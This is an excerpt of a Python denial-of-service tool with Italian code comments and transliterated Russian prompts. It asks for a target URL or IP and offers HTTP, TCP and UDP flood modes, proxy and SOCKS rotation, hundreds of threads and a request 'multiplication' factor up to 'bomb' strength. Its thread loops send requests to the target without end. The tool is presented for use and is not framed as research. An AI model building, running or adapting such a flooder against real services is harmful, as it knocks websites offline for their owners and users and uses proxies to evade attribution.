...
try: # se si è sotto linux scapy (per l'attacco tcp-udp) funziona
	...
	print ("POTOK TCP / UDP NE PODDERZHIVAYETSYA V ETOY SISTEME. VY DOLZHNY ISPOL'ZOVAT' HTTP FLOOD.") # printa questo
...
def starturl(): # in questa funzione setto l'url per renderlo usabile per il futuro settaggio delle richieste HTTP.
	...
	url = input("\Vstavte URL / IP: ").strip()

	if url == "":
		print ("Pozhaluysta, vvedite URL.")
		starturl()
...
def floodmode(): # la scelta della modalità di attacco
	global choice1
	choice1 = input("Vy khotite vypolnit HTTP-flud '0' (luchshiy), TCP-flud '1' ili UDP-flud '2'?")
	if choice1 == "0":
		proxymode()
	elif choice1 == "1":
		try:
			if os.getuid() != 0: # se il programma NON e' stato eseguito come root:
				print("Vam nuzhno zapustit etu programmu ot imeni polzovatelya root, chtoby ispolzovat' TCP / UDP-fluding.") # printa questo
				exit(0) # e esce
			else: # altrimenti
				floodport() # continua
		except:
...
def floodport():
	global port
	try:
		port = int(input("Vvedite port, kotoryy vy khotite zalit:"))
		...
		print ("poprobuyte yeshche raz.") # printa questo e
		floodport() # riparte la funzione e ti fa riscrivere
	proxymode()

def proxymode():
	global choice2
	choice2 = input("Khotite rezhim proksi / noski? Otvette 'y', chtoby vklyuchit yego: ")
	if choice2 == "y":
		choiceproxysocks()
	else:
		numthreads()
...
def choiceproxysocks():
	global choice3
	choice3 = input("Vvedite «0», chtoby vklyuchit proksi-rezhim, ili «1», chtoby vklyuchit socksmode: ")
	if choice3 == "0":
		choicedownproxy()
	elif choice3 == "1":
		choicedownsocks()
...
def choicedownproxy():
	choice4 = input("Khotite skachat novyy spisok proksi? Otvette «u», chtoby sdelat eto:")
	if choice4 == "y":
...
def choicedownsocks():
	choice4 = input("hotite skachat novyy spisok proksi? Otvette «u», chtoby sdelat eto")
	if choice4 == "y":
...
def proxylist():
	global proxies
	out_file = str(input("Vvedite imya / put k proksilistu (proxy.txt):"))
	if out_file == "":
		out_file = "proxy.txt"
...
def numthreads():
	global threads
	try:
		threads = int(input("Vvedite kolichestvo potokov (800): "))
	except ValueError:
		threads = 800
		print ("800 vybrano\n")
	multiplication()
...
def multiplication():
	global multiple
	try:
		multiple = int(input("Vvedite chislo umnozheniya dlya ataki [(1-5 = normalnoye) (50 = moshchnoye) (100 ili bolshe = bomba)]: "))
	except ValueError:
		print("poprobuyte yeshche raz.\n")
		multiplication()
	begin()
...
def begin():
	choice6 = input("Nazhmite «Enter», chtoby nachat' ataku: ")
	if choice6 == "":
		loop()
	...
	def run(self): # la funzione che da' le istruzioni ai vari threads
		...
		while True:
			try:
				...
				s.send(p) # ed invia
				print ("Zapros otpravlen " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) # print req + counter
		...
		while True:
			try:
				...
				try:
					...
					print ("Nosok vniz. Povtornaya popytka zaprosa. @", self.counter)
	...
	def run(self): # la funzione che da' le istruzioni ai vari threads
		...
		while True: # ciclo infinito
			try: # il try per non far chiudere il programma se qualcosa va storto
				...
				print ("Zapros otpravlen! @", self.counter) # print richiesta + counter
				try: # invia altre richieste nello stesso thread
					for y in range(multiple): # fattore di moltiplicazione
						s.send(str.encode(p)) # encode in bytes della richiesta HTTP
				except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
	...
	def run(self): # la funzione che da' le istruzioni ai vari threads
		...
		while True:
			try:
				...
				s.connect((str(url2),int(port))) # connessione
				s.send(p) # invio
				print ("Zapros otpravlen " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) # req + counter
				try: # invia altre richieste nello stesso thread
					for y in range(multiple): # fattore di moltiplicazione
						s.send(str.encode(p)) # encode in bytes della richiesta HTTP
				except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
	...
	def run(self): # la funzione che da' le istruzioni ai vari threads
		...
		while True: # ciclo infinito
			try: # il try per non far chiudere il programma se si verifica qualche errore
				...
				print ("Zapros otpravlen! @", self.counter) # print req + counter
				try: # invia altre richieste nello stesso thread
					for y in range(multiple): # fattore di moltiplicazione
						s.send(str.encode(p)) # encode in bytes della richiesta HTTP
				except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
	...
	def run(self): # la funzione che da' le istruzioni ai vari threads
		...
		while True: # ciclo infinito
			try:
				...
				print ("Zapros otpravlen " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) # print delle richieste
				try: # invia altre richieste nello stesso thread
					for y in range(multiple): # fattore di moltiplicazione
						s.send(str.encode(request)) # encode in bytes della richiesta HTTP
				except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
